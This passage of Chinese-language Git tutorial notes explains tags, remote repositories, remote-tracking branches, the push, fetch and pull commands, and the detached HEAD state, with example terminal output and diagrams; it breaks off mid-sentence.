这个过程就像共享远程分支一样——你可以运行`git push origin <tagname>`。\n```shell\n$ git push origin v1.5\nCounting objects: 14, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (12/12), done.\nWriting objects: 100% (14/14), 2.05 KiB | 0 bytes/s, done.\nTotal 14 (delta 3), reused 0 (delta 0)\nTo git@github.com:schacon/simplegit.git\n * [new tag]         v1.5 -> v1.5\n```\n如果想要一次性推送很多标签，也可以使用带有`--tags`选项的`git push`命令。 这将会把所有不在远程仓库服务器上的标签全部传送到那里。\n```shell\n$ git push origin --tags\nCounting objects: 1, done.\nWriting objects: 100% (1/1), 160 bytes | 0 bytes/s, done.\nTotal 1 (delta 0), reused 0 (delta 0)\nTo git@github.com:schacon/simplegit.git\n * [new tag]         v1.4 -> v1.4\n * [new tag]         v1.4-lw -> v1.4-lw\n```\n现在，当其他人从仓库中克隆或拉取，他们也能得到你的那些标签。\n\n>Note\n`git push`推送两种标签\n使用`git push <remote> --tags`推送标签并不会区分轻量标签和附注标签， 没有简单的选项能够让你只选择推送一种标签。\n\n## 删除标签\n要删除掉你本地仓库上的标签，可以使用命令`git tag -d <tagname>`。 例如，可以使用以下命令删除一个轻量标签：\n```shell\n$ git tag -d v1.4-lw\nDeleted tag 'v1.4-lw' (was e7d5add)\n```\n注意上述命令并不会从任何远程仓库中移除这个标签，你必须用`git push <remote> :refs/tags/<tagname>`来更新你的远程仓库：\n\n第一种变体是`git push <remote> :refs/tags/<tagname>`：\n```shell\n$ git push origin :refs/tags/v1.4-lw\nTo /git@github.com:schacon/simplegit.git\n - [deleted]         v1.4-lw\n```\n上面这种操作的含义是，将冒号前面的空值推送到远程标签名，从而高效地删除它。\n\n第二种更直观的删除远程标签的方式是：\n```shell\n$ git push origin --delete <tagname>\n```\n\n## 检出标签\n如果你想查看某个标签所指向的文件版本，可以使用`git checkout`命令， 虽然这会使你的仓库处于“分离头指针（detached HEAD）”的状态——这个状态有些不好的副作用：\n```shell\n$ git checkout 2.0.0\nNote: checking out '2.0.0'.\n\nYou are in 'detached HEAD' state. You can look around, make experimental\nchanges and commit them, and you can discard any commits you make in this\nstate without impacting any branches by performing another checkout.\n\nIf you want to create a new branch to retain commits you create, you may\ndo so (now or later) by using -b with the checkout command again. Example:\n\n  git checkout -b <new-branch>\n\nHEAD is now at 99ada87... Merge pull request #89 from schacon/appendix-final\n\n$ git checkout 2.0-beta-0.1\nPrevious HEAD position was 99ada87... Merge pull request #89 from schacon/appendix-final\nHEAD is now at df3f601... add atlas.json and cover image\n```\n在“分离头指针”状态下，如果你做了某些更改然后提交它们，标签不会发生变化， 但你的新提交将不属于任何分支，并且将无法访问，除非通过确切的提交哈希才能访问。 因此，如果你需要进行更改，比如你要修复旧版本中的错误，那么通常需要创建一个新分支：\n```shell\n$ git checkout -b version2 v2.0.0\nSwitched to a new branch 'version2'\n```\n如果在这之后又进行了一次提交，version2 分支就会因为这个改动向前移动， 此时它就会和 v2.0.0 标签稍微有些不同，这时就要当心了。\n\n# 远程\n## 远程仓库的使用\n为了能在任意 Git 项目上协作，你需要知道如何管理自己的远程仓库。 远程仓库是指托管在因特网或其他网络中的你的项目的版本库。 你可以有好几个远程仓库，通常有些仓库对你只读，有些则可以读写。 与他人协作涉及管理远程仓库以及根据需要推送或拉取数据。 管理远程仓库包括了解如何添加远程仓库、移除无效的远程仓库、管理不同的远程分支并定义它们是否被跟踪等等。 在本节中，我们将介绍一部分远程管理的技能。\n\n>Note\n远程仓库可以在你的本地主机上\n你完全可以在一个“远程”仓库上工作，而实际上它在你本地的主机上。 词语“远程”未必表示仓库在网络或互联网上的其它位置，而只是表示它在别处。 在这样的远程仓库上工作，仍然需要和其它远程仓库上一样的标准推送、拉取和抓取操作。\n\n### 查看远程仓库\n如果想查看你已经配置的远程仓库服务器，可以运行`git remote`命令。 它会列出你指定的每一个远程服务器的简写。 如果你已经克隆了自己的仓库，那么至少应该能看到 `origin`——这是 Git 给你克隆的仓库服务器的默认名字：\n```shell\n$ git clone https://github.com/schacon/ticgit\nCloning into 'ticgit'...\nremote: Reusing existing pack: 1857, done.\nremote: Total 1857 (delta 0), reused 0 (delta 0)\nReceiving objects: 100% (1857/1857), 374.35 KiB | 268.00 KiB/s, done.\nResolving deltas: 100% (772/772), done.\nChecking connectivity... done.\n$ cd ticgit\n$ git remote\norigin\n```\n你也可以指定选项`-v`，会显示需要读写远程仓库使用的 Git 保存的简写与其对应的 URL。\n```shell\n$ git remote -v\norigin\thttps://github.com/schacon/ticgit (fetch)\norigin\thttps://github.com/schacon/ticgit (push)\n```\n如果你的远程仓库不止一个，该命令会将它们全部列出。 例如，与几个协作者合作的，拥有多个远程仓库的仓库看起来像下面这样：\n```shell\n$ cd grit\n$ git remote -v\nbakkdoor  https://github.com/bakkdoor/grit (fetch)\nbakkdoor  https://github.com/bakkdoor/grit (push)\ncho45     https://github.com/cho45/grit (fetch)\ncho45     https://github.com/cho45/grit (push)\ndefunkt   https://github.com/defunkt/grit (fetch)\ndefunkt   https://github.com/defunkt/grit (push)\nkoke      git://github.com/koke/grit.git (fetch)\nkoke      git://github.com/koke/grit.git (push)\norigin    git@github.com:mojombo/grit.git (fetch)\norigin    git@github.com:mojombo/grit.git (push)\n```\n这表示我们能非常方便地拉取其它用户的贡献。我们还可以拥有向他们推送的权限，这里暂不详述。\n\n注意这些远程仓库使用了不同的协议。我们将会在 在服务器上搭建 Git 中了解关于它们的更多信息。\n\n### 添加远程仓库\n我们在之前的章节中已经提到并展示了`git clone`命令是如何自行添加远程仓库的， 不过这里将告诉你如何自己来添加它。 运行`git remote add <shortname> <url>`添加一个新的远程 Git 仓库，同时指定一个方便使用的简写：\n```shell\n$ git remote\norigin\n$ git remote add pb https://github.com/paulboone/ticgit\n$ git remote -v\norigin\thttps://github.com/schacon/ticgit (fetch)\norigin\thttps://github.com/schacon/ticgit (push)\npb\thttps://github.com/paulboone/ticgit (fetch)\npb\thttps://github.com/paulboone/ticgit (push)\n```\n现在你可以在命令行中使用字符串`pb`来代替整个 URL。 例如，如果你想拉取`Paul`的仓库中有但你没有的信息，可以运行`git fetch pb`：\n```shell\n$ git fetch pb\nremote: Counting objects: 43, done.\nremote: Compressing objects: 100% (36/36), done.\nremote: Total 43 (delta 10), reused 31 (delta 5)\nUnpacking objects: 100% (43/43), done.\nFrom https://github.com/paulboone/ticgit\n * [new branch]      master     -> pb/master\n * [new branch]      ticgit     -> pb/ticgit\n```\n现在 Paul 的 master 分支可以在本地通过 pb/master 访问到——你可以将它合并到自己的某个分支中， 或者如果你想要查看它的话，可以检出一个指向该点的本地分支。 （我们将会在 Git 分支 中详细介绍什么是分支以及如何使用分支。）\n\n### 从远程仓库中抓取与拉取\n就如刚才所见，从远程仓库中获得数据，可以执行：\n```shell\n$ git fetch <remote>\n```\n这个命令会访问远程仓库，从中拉取所有你还没有的数据。 执行完成后，你将会拥有那个远程仓库中所有分支的引用，可以随时合并或查看。\n\n如果你使用`clone`命令克隆了一个仓库，命令会自动将其添加为远程仓库并默认以 “origin” 为简写。 所以，`git fetch origin`会抓取克隆（或上一次抓取）后新推送的所有工作。 必须注意`git fetch`命令只会将数据下载到你的本地仓库——它并不会自动合并或修改你当前的工作。 当准备好时你必须手动将其合并入你的工作。\n\n如果你的当前分支设置了跟踪远程分支（阅读下一节和 Git 分支 了解更多信息）， 那么可以用 git pull 命令来自动抓取后合并该远程分支到当前分支。 这或许是个更加简单舒服的工作流程。默认情况下，git clone 命令会自动设置本地 master 分支跟踪克隆的远程仓库的 master 分支（或其它名字的默认分支）。 运行 git pull 通常会从最初克隆的服务器上抓取数据并自动尝试合并到当前所在的分支。\n\n### 推送到远程仓库\n当你想分享你的项目时，必须将其推送到上游。 这个命令很简单：`git push <remote> <branch>`。 当你想要将 master 分支推送到 origin 服务器时（再次说明，克隆时通常会自动帮你设置好那两个名字）， 那么运行这个命令就可以将你所做的备份到服务器：\n```shell\n$ git push origin master\n```\n只有当你有所克隆服务器的写入权限，并且之前没有人推送过时，这条命令才能生效。 当你和其他人在同一时间克隆，他们先推送到上游然后你再推送到上游，你的推送就会毫无疑问地被拒绝。 你必须先抓取他们的工作并将其合并进你的工作后才能推送。 阅读 Git 分支 了解如何推送到远程仓库服务器的详细信息。\n\n### 查看某个远程仓库\n如果想要查看某一个远程仓库的更多信息，可以使用`git remote show <remote>`命令。 如果想以一个特定的缩写名运行这个命令，例如 origin，会得到像下面类似的信息：\n```shell\n$ git remote show origin\n* remote origin\n  Fetch URL: https://github.com/schacon/ticgit\n  Push  URL: https://github.com/schacon/ticgit\n  HEAD branch: master\n  Remote branches:\n    master                               tracked\n    dev-branch                           tracked\n  Local branch configured for 'git pull':\n    master merges with remote master\n  Local ref configured for 'git push':\n    master pushes to master (up to date)\n```\n它同样会列出远程仓库的 URL 与跟踪分支的信息。 这些信息非常有用，它告诉你正处于 master 分支，并且如果运行`git pull`， 就会抓取所有的远程引用，然后将远程 master 分支合并到本地 master 分支。 它也会列出拉取到的所有远程引用。\n\n这是一个经常遇到的简单例子。 如果你是 Git 的重度使用者，那么还可以通过`git remote show`看到更多的信息。\n```shell\n$ git remote show origin\n* remote origin\n  URL: https://github.com/my-org/complex-project\n  Fetch URL: https://github.com/my-org/complex-project\n  Push  URL: https://github.com/my-org/complex-project\n  HEAD branch: master\n  Remote branches:\n    master                           tracked\n    dev-branch                       tracked\n    markdown-strip                   tracked\n    issue-43                         new (next fetch will store in remotes/origin)\n    issue-45                         new (next fetch will store in remotes/origin)\n    refs/remotes/origin/issue-11     stale (use 'git remote prune' to remove)\n  Local branches configured for 'git pull':\n    dev-branch merges with remote dev-branch\n    master     merges with remote master\n  Local refs configured for 'git push':\n    dev-branch                     pushes to dev-branch                     (up to date)\n    markdown-strip                 pushes to markdown-strip                 (up to date)\n    master                         pushes to master                         (up to date)\n```\n这个命令列出了当你在特定的分支上执行 git push 会自动地推送到哪一个远程分支。 它也同样地列出了哪些远程分支不在你的本地，哪些远程分支已经从服务器上移除了， 还有当你执行 git pull 时哪些本地分支可以与它跟踪的远程分支自动合并。\n\n### 远程仓库的重命名与移除\n你可以运行`git remote rename`来修改一个远程仓库的简写名。 例如，想要将 pb 重命名为 paul，可以用`git remote rename`这样做：\n```shell\n$ git remote rename pb paul\n$ git remote\norigin\npaul\n```\n值得注意的是这同样也会修改你所有远程跟踪的分支名字。 那些过去引用 pb/master 的现在会引用 paul/master。\n\n如果因为一些原因想要移除一个远程仓库——你已经从服务器上搬走了或不再想使用某一个特定的镜像了， 又或者某一个贡献者不再贡献了——可以使用`git remote remove`或 `git remote rm` ：\n```shell\n$ git remote remove paul\n$ git remote\norigin\n```\n一旦你使用这种方式删除了一个远程仓库，那么所有和这个远程仓库相关的远程跟踪分支以及配置信息也会一起被删除。\n\n## 远程分支\n远程引用是对远程仓库的引用（指针），包括分支、标签等等。 你可以通过`git ls-remote <remote>`来显式地获得远程引用的完整列表， 或者通过`git remote show <remote>`获得远程分支的更多信息。 然而，一个更常见的做法是利用远程跟踪分支。\n\n**远程跟踪分支是远程分支状态的引用。它们是你无法移动的本地引用。即远程分支不是本地分支，如果使用`git checkout <远程分支名>`, 则HEAD会变成游离状态**。一旦你进行了网络通信， Git 就会为你移动它们以精确反映远程仓库的状态。请将它们看做书签， 这样可以提醒你该分支在远程仓库中的位置就是你最后一次连接到它们的位置。\n\n它们以`<remote>/<branch>`的形式命名。 例如，如果你想要看你最后一次与远程仓库`origin`通信时`master`分支的状态，你可以查看`origin/master`分支。 你与同事合作解决一个问题并且他们推送了一个`iss53`分支，你可能有自己的本地`iss53`分支， 然而在服务器上的分支会以`origin/iss53`来表示。\n\n这可能有一点儿难以理解，让我们来看一个例子。 假设你的网络里有一个在`git.ourcompany.com`的 Git 服务器。 如果你从这里克隆，Git 的 clone 命令会为你自动将其命名为 origin，拉取它的所有数据， 创建一个指向它的 master 分支的指针，并且在本地将其命名为`origin/master`。 Git 也会给你一个与 origin 的 master 分支在指向同一个地方的本地 master 分支，这样你就有工作的基础。\n\n>Note\n“origin” 并无特殊含义\n远程仓库名字 “origin” 与分支名字 “master” 一样，在 Git 中并没有任何特别的含义一样。 同时 “master” 是当你运行 git init 时默认的起始分支名字，原因仅仅是它的广泛使用， “origin” 是当你运行 git clone 时默认的远程仓库名字。 如果你运行`git clone -o booyah`，那么你默认的远程分支名字将会是`booyah/master`。\n\n克隆之后的服务器与本地仓库。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104629.png)\n\n如果你在本地的 master 分支做了一些工作，在同一段时间内有其他人推送提交到`git.ourcompany.com`并且更新了它的 master 分支，这就是说你们的提交历史已走向不同的方向。 即便这样，只要你保持不与 origin 服务器连接（并拉取数据），你的 origin/master 指针就不会移动。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104637.png)\n\n如果要与给定的远程仓库同步数据，运行`git fetch <remote>`命令（在本例中为`git fetch origin`）。 这个命令查找 “origin” 是哪一个服务器（在本例中，它是 git.ourcompany.com）， 从中抓取本地没有的数据，并且更新本地数据库，移动 origin/master 指针到更新之后的位置。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104650.png)\n\n为了演示有多个远程仓库与远程分支的情况，我们假定你有另一个内部 Git 服务器，仅服务于你的某个敏捷开发团队。 这个服务器位于`git.team1.ourcompany.com`。 你可以运行`git remote add`命令添加一个新的远程仓库引用到当前的项目，这个命令我们会在 Git 基础 中详细说明。 将这个远程仓库命名为`teamone`，将其作为完整 URL 的缩写。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104728.png)\n\n现在，可以运行`git fetch teamone`来抓取远程仓库`teamone`有而本地没有的数据。 因为那台服务器上现有的数据是 origin 服务器上的一个子集， 所以 Git 并不会抓取数据而是会设置远程跟踪分支`teamone/master`指向 teamone 的 master 分支。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104748.png)\n\n### 推送\n当你想要公开分享一个分支时，需要将其推送到有写入权限的远程仓库上。 本地的分支并不会自动与远程仓库同步——你必须显式地推送想要分享的分支。 这样，你就可以把不愿意分享的内容放到私人分支上，而将需要和别人协作的内容推送到公开分支。\n\n如果希望和别人一起在名为 serverfix 的分支上工作，你可以像推送第一个分支那样推送它。 运行`git push <remote> <branch>`:\n```shell\n$ git push origin serverfix\nCounting objects: 24, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (15/15), done.\nWriting objects: 100% (24/24), 1.91 KiB | 0 bytes/s, done.\nTotal 24 (delta 2), reused 0 (delta 0)\nTo https://github.com/schacon/simplegit\n * [new branch]      serverfix -> serverfix\n```\n这里有些工作被简化了。 Git 自动将`serverfix`分支名字展开为`refs/heads/serverfix:refs/heads/serverfix`， 那意味着，“推送本地的 serverfix 分支来更新远程仓库上的 serverfix 分支。” 我们将会详细学习 Git 内部原理 的 refs/heads/ 部分， 但是现在可以先把它放在儿。你也可以运行`git push origin serverfix:serverfix`， 它会做同样的事——也就是说“推送本地的 serverfix 分支，将其作为远程仓库的 serverfix 分支” 可以通过这种格式来推送本地分支到一个命名不相同的远程分支。 如果并不想让远程仓库上的分支叫做 serverfix，可以运行`git push origin serverfix:awesomebranch`来将本地的 serverfix 分支推送到远程仓库上的 awesomebranch 分支。\n\n>Note\n如何避免每次输入密码\n如果你正在使用 HTTPS URL 来推送，Git 服务器会询问用户名与密码。 默认情况下它会在终端中提示服务器是否允许你进行推送。\n如果不想在每一次推送时都输入用户名与密码，你可以设置一个 “credential cache”。 最简单的方式就是将其保存在内存中几分钟，可以简单地运行`git config --global credential.helper cache`来设置它。\n想要了解更多关于不同验证缓存的可用选项，查看 凭证存储。\n\n下一次其他协作者从服务器上抓取数据时，他们会在本地生成一个远程分支 origin/serverfix，指向服务器的 serverfix 分支的引用：\n```shell\n$ git fetch origin\nremote: Counting objects: 7, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 3 (delta 0)\nUnpacking objects: 100% (3/3), done.\nFrom https://github.com/schacon/simplegit\n * [new branch]      serverfix    -> origin/serverfix\n```\n要特别注意的一点是当抓取到新的远程跟踪分支时，本地不会自动生成一份可编辑的副本（拷贝）。 换一句话说，这种情况下，不会有一个新的 serverfix 分支——只有一个不可以修改的 origin/serverfix 指针。\n\n可以运行`git merge origin/serverfix`将这些工作合并到当前所在的分支。 如果想要在自己的`serverfix`分支上工作，可以将其建立在远程跟踪分支之上：\n```shell\n$ git checkout -b serverfix origin/serverfix\nBranch serverfix set up to track remote branch serverfix from origin.\nSwitched to a new branch 'serverfix'\n```\n这会给你一个用于工作的本地分支，并且起点位于`origin/serverfix`。\n\n#### git push详解\ngit push命令用于将本地分支的更新，推送到远程主机。它的格式与git pull命令相仿。\n```shell\n$ git push <远程主机名> <本地分支名>:<远程分支名>\n```\n注意，分支推送顺序的写法是<来源地>:<目的地>，所以git pull是<远程分支>:<本地分支>，而git push是<本地分支>:<远程分支>。\n<font color=\"red\">如果省略远程分支名，则表示将本地分支推送与之同名的远程分支(**不管你是否设置了本地分支跟踪哪个远程分支，都是推送至同名的远程分支**)，如果该远程分支不存在，则会被新建。</font>\n```shell\n$ git push origin master\n```\n上面命令表示，将本地的master分支推送到origin主机的master分支(不管master分支是否跟踪了哪个远程分支)。如果后者不存在，则会被新建。\n\n如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。\n```shell\n$ git push origin :master\n# 等同于\n$ git push origin --delete master\n```\n上面命令表示删除origin主机的master分支。\n如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。\n```shell\n$ git push origin\n```\n上面命令表示，将当前分支推送到origin主机的对应分支。\n如果当前分支只有一个追踪分支，那么主机名都可以省略。\n```shell\n$ git push\n```\n如果当前分支与多个主机存在追踪关系，则可以使用-u选项指定一个默认主机，这样后面就可以不加任何参数使用git push。\n```shell\n$ git push -u origin master\n```\n上面命令将本地的master分支推送到origin主机，同时指定origin为默认主机，后面就可以不加任何参数使用git push了。\n不带任何参数的git push，默认只推送当前分支，这叫做simple方式。此外，还有一种matching方式，会推送所有有对应的远程分支的本地分支。Git 2.0版本之前，默认采用matching方法，现在改为默认采用simple方式。如果要修改这个设置，可以采用git config命令。\n```shell\n$ git config --global push.default matching\n# 或者\n$ git config --global push.default simple\n```\n还有一种情况，就是不管是否存在对应的远程分支，将本地的所有分支都推送到远程主机，这时需要使用--all选项。\n```shell\n$ git push --all origin\n```\n上面命令表示，将所有本地分支都推送到origin主机。\n如果远程主机的版本比本地版本更新，推送时Git会报错，要求先在本地做git pull合并差异，然后再推送到远程主机。这时，如果你一定要推送，可以使用--force选项。\n```shell\n$ git push --force origin \n```\n上面命令使用--force选项，结果导致远程主机上更新的版本被覆盖。除非你很确定要这样做，否则应该尽量避免使用--force选项。\n最后，git push不会推送标签（tag），除非使用--tags选项。\n```shell\n$ git push origin --tags\n```\n\n#### push.default\nGit中`push.default`表示只使用`git push`命令而不带任何参数时，其默认push的远程分支，其取值可以是：\n- `nothing` - push操作无效，除非显式指定远程分支（想让push变得简单的就不要用这个）\n- `current` - push当前分支到远程同名分支，如果远程同名分支不存在则自动创建同名分支（central 和 non-central workflows都适用）\n- `upstream` - push当前分支到它的upstream分支上（通常用于central workflow）\n- `simple` - simple和upstream是相似的（通常用于central workflow），只有一点不同，simple必须保证本地分支和它的远程 upstream分支同名，否则会拒绝push操作\n- `matching` - push所有本地和远程两端都存在的同名分支\n\ncentral / non-central workflows 是Git的两种常见工作流场景：\n- `central workflows` - 集中式工作流，一个分支的push和pull都是同一个远程仓库\n- `non-central workflows` - 非集中式工作流，一个分支的push和pull可能分别都有不同的远程仓库\n在Git 2.0之前，push.default的内建值被设为'matching'，2.0之后则被更改为了'simple'。\n\n### 跟踪分支\n从一个远程跟踪分支检出一个本地分支会自动创建所谓的“跟踪分支”（它跟踪的分支叫做“上游分支”）。 跟踪分支是与远程分支有直接关系的本地分支。 如果在一个跟踪分支上输入 git pull而没有带有任何参数时，Git 能自动地识别去哪个服务器上抓取、合并到哪个分支。\n\n当克隆一个仓库时，它通常会自动地创建一个跟踪 origin/master 的 master 分支。 然而，如果你愿意的话可以设置其他的跟踪分支，或是一个在其他远程仓库上的跟踪分支，又或者不跟踪 master 分支。 最简单的实例就是像之前看到的那样，运行`git checkout -b <branch> <remote>/<branch>`。 这是一个十分常用的操作所以 Git 提供了 `--track`快捷方式：\n```shell\n$ git checkout --track origin/serverfix\nBranch serverfix set up to track remote branch serverfix from origin.\nSwitched to a new branch 'serverfix'\n```\n由于这个操作太常用了，该捷径本身还有一个捷径。 如果你尝试检出的分支 (a) 不存在且 (b) 刚好只有一个名字与之匹配的远程分支，那么 Git 就会为你创建一个跟踪分支：\n```shell\n$ git checkout serverfix\nBranch serverfix set up to track remote branch serverfix from origin.\nSwitched to a new branch 'serverfix'\n```\n如果想要将本地分支与远程分支设置为不同的名字，你可以轻松地使用上一个命令增加一个不同名字的本地分支：\n```shell\n$ git checkout -b sf origin/serverfix\nBranch sf set up to track remote branch serverfix from origin.\nSwitched to a new branch 'sf'\n```\n现在，本地分支 sf 会自动从 origin/serverfix 拉取。\n\n设置已有的本地分支跟踪一个刚刚拉取下来的远程分支，或者想要修改正在跟踪的上游分支， 你可以在任意时间使用`-u`或`--set-upstream-to`选项运行 git branch 来显式地设置。\n如下为设置当前分支跟踪远程分支origin/serverfix\n```shell\n$ git branch -u origin/serverfix\nBranch serverfix set up to track remote branch serverfix from origin.\n```\n\n>Note\n上游快捷方式\n当设置好跟踪分支后，可以通过简写 @{upstream} 或 @{u} 来引用它的上游分支。 所以在 master 分支时并且它正在跟踪 origin/master 时，如果愿意的话可以使用 git merge @{u} 来取代 git merge origin/master。\n\n\n如果想要查看设置的所有跟踪分支，可以使用`git branch`的`-vv`选项。 这会将所有的本地分支列出来并且包含更多的信息，如每一个分支正在跟踪哪个远程分支与本地分支是否是领先、落后或是都有。\n```shell\n$ git branch -vv\n  iss53     7e424c3 [origin/iss53: ahead 2] forgot the brackets\n  master    1ae2a45 [origin/master] deploying index fix\n* serverfix f8674d9 [teamone/server-fix-good: ahead 3, behind 1] this should do it\n  testing   5ea463a trying something new\n```\n这里可以看到`iss53`分支正在跟踪`origin/iss53`并且 “ahead” 是 2，意味着本地有两个提交还没有推送到服务器上。 也能看到 master 分支正在跟踪 origin/master 分支并且是最新的。 接下来可以看到 serverfix 分支正在跟踪 teamone 服务器上的 server-fix-good 分支并且领先 3 落后 1， 领先3表示本地有三次提交还没有推送到远程服务器上；落后1表示远程服务器上有一次提交还没有合并入。 最后看到 testing 分支并没有跟踪任何远程分支。\n\n**需要重点注意的一点是这些数字的值来自于你从每个服务器上最后一次抓取的数据**。 这个命令并没有连接服务器，它只会告诉你关于本地缓存的服务器数据。 如果想要统计最新的领先与落后数字，需要在运行此命令前抓取所有的远程仓库。 可以像这样做：\n```shell\n$ git fetch --all; git branch -vv\n```\n\n#### 跟踪分支的作用\n1. 配合不带参数的git push、git pull使用\n2. 通过git branch -vv命令可以清楚的知道跟踪分支与它跟踪的远程分支之间的提交状态关系\n\n### 拉取\n当 git fetch 命令从服务器上抓取本地没有的数据时，它并不会修改工作目录中的内容。 它只会获取数据然后让你自己合并。 然而，有一个命令叫作 git pull 在大多数情况下它的含义是一个 git fetch 紧接着一个 git merge 命令。 如果有一个像之前章节中演示的设置好的跟踪分支，不管它是显式地设置还是通过 clone 或 checkout 命令为你创建的，git pull 都会查找当前分支所跟踪的服务器与分支， 从服务器上抓取数据然后尝试合并入那个远程分支。\n\n由于`git pull`的魔法经常令人困惑所以通常单独显式地使用 fetch 与 merge 命令会更好一些。\n\n#### git fetch详解\n一旦远程主机的版本库有了更新（Git术语叫做commit），需要将这些更新取回本地，这时就要用到`git fetch`命令。\n```shell\n$ git fetch <远程主机名>\n```\n上面命令将某个远程主机的更新，**全部**取回本地。\n`git fetch`命令通常用来查看其他人的进程，因为它取回的代码对你本地的开发代码没有影响。\n\n默认情况下，`git fetch`取回所有分支（branch）的更新。如果只想取回特定分支的更新，可以指定分支名。\n```shell\n$ git fetch <远程主机名> <分支名>\n```\n比如，取回origin主机的master分支。\n```shell\n$ git fetch origin master\n```\n所取回的更新，在本地主机上要用\"远程主机名/分支名\"的形式读取。比如origin主机的master，就要用origin/master读取。\ngit branch命令的-r选项，可以用来查看远程分支，-a选项查看所有分支。\n```shell\n$ git branch -r\norigin/master\n\n$ git branch -a\n* master\n  remotes/origin/master\n```\n上面命令表示，本地主机的当前分支是master，远程分支是origin/master。\n取回远程主机的更新以后，可以在它的基础上，使用git checkout命令创建一个新的分支。\n```shell\n$ git checkout -b newBrach origin/master\n```\n上面命令表示，在origin/master的基础上，创建一个新分支。\n此外，也可以使用git merge命令或者git rebase命令，在本地分支上合并远程分支。\n```shell\n$ git merge origin/master\n# 或者\n$ git rebase origin/master\n```\n上面命令表示在当前分支上，合并`origin/master`。\n\n#### git pull详解\ngit pull命令的作用是，取回远程主机某个分支的更新，再与本地的指定分支合并。它的完整格式稍稍有点复杂。\n```shell\n$ git pull <远程主机名> <远程分支名>:<本地分支名>\n```\n比如，取回origin主机的next分支，与本地的master分支合并，需要写成下面这样。\n```shell\n$ git pull origin next:master\n````\n如果远程分支是与当前分支合并，则冒号后面的部分可以省略。\n```shell\n$ git pull origin next\n```\n上面命令表示，取回origin/next分支，**再与当前分支合并, 而不管是否有跟踪分支跟踪origin/next分支**。实质上，这等同于先做git fetch，再做git merge。\n```shell\n$ git fetch origin\n$ git merge origin/next\n```\n在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在git clone的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的master分支自动\"追踪\"origin/master分支。\nGit也允许手动建立追踪关系。\n```shell\ngit branch --set-upstream master origin/next\n```\n上面命令指定master分支追踪origin/next分支。\n如果当前分支与远程分支存在追踪关系，git pull就可以省略远程分支名。\n```shell\n$ git pull origin\n```\n上面命令表示，本地的当前分支自动与对应的origin主机\"追踪分支\"（remote-tracking branch）进行合并。\n如果当前分支只有一个追踪分支，连远程主机名都可以省略。\n```shell\n$ git pull\n````\n**上面命令表示，当前分支自动与唯一一个追踪分支进行合并。**\n如果合并需要采用rebase模式，可以使用--rebase选项。\n```shell\n$ git pull --rebase <远程主机名> <远程分支名>:<本地分支名>\n```\n如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支。\n但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。\n```shell\n$ git pull -p\n# 等同于下面的命令\n$ git fetch --prune origin \n$ git fetch -p\n```\n\n### 删除远程分支\n假设你已经通过远程分支做完所有的工作了——也就是说你和你的协作者已经完成了一个特性， 并且将其合并到了远程仓库的 master 分支（或任何其他稳定代码分支）。 可以运行带有`--delete`选项的`git push`命令来删除一个远程分支。 如果想要从服务器上删除 serverfix 分支，运行下面的命令：\n```shell\n$ git push origin --delete serverfix\nTo https://github.com/schacon/simplegit\n - [deleted]         serverfix\n```\n基本上这个命令做的只是从服务器上移除这个指针。 Git 服务器通常会保留数据一段时间直到垃圾回收运行，所以如果不小心删除掉了，通常是很容易恢复的。\n\n# HEAD 的游离状态\nHEAD处理游离状态，表示HEAD指向的是某个具体的提交对象而不是分支名\n\n一般我们会使用命令`git checkout <branch_name>`来切换分支，HEAD 就会移动到指定的分支上。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104758.png)\n\n但是，如果我们使用的是`git checkout <commit_id>`来切换到指定的某一次提交，HEAD 就会处于`detached`状态(HEAD detached from XXX)，也就是游离状态。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104808.png)\n\n## HEAD 游离状态的利弊\n好处：HEAD 处于游离状态时，开发者可以很方便地在历史版本之间互相切换，比如要回到某次提交，只需要 checkout 对应的 commit id 或者 tag 名即可。\n弊端：若在该基础上进行了提交，则会新开一个「匿名分支」；也就是说我们的提交是无法可见保存的，<font color=\"red\">一旦切换到别的分支，原游离状态以后的提交就不可追溯了。</font>\n\n## 实际情景\n下面我们来看看实际的例子。\n首先查看一下当前的分支情况，当前只有一个 master 分支：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104818.png)\n\n再来查看下近期的 log 日志：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104833.png)\n\n然后假设我要回到倒数第二条 commit 时候的状态，顺便查看下本地工作目录状态以及分支状态：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104843.png)\n\n可以看到，我还没有修改和提交的情况下，切换完成就给我新建了一个分支，并且指明 HEAD 正游离在 2772886 的`<commit id>`上。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104855.png)\n\n如果不做任何修改，想回到 master 分支，直接 git checkout master 即可，而不要 checkout master 主干所对应的`<commit id>`。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104906.png)\n\n顺利回到主干的话，HEAD 的游离状态会取消，原临时游离分支也会消失。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104917.png)\n\n如果是在游离状态做了修改和提交，则：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104929.png)\n\n切换会 master 分支时，在游离状态所做的修改和提交无法追溯：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104943.png)\n\n## 如何解决\n其实很简单，刚才有仔细看终端提示的同学就会知道，在切换到游离状态的时候应该新建一个分支，然后我们所有的操作修改和提交都会保存到该分支，HEAD 也就指向了该分支最新提交的 commit id 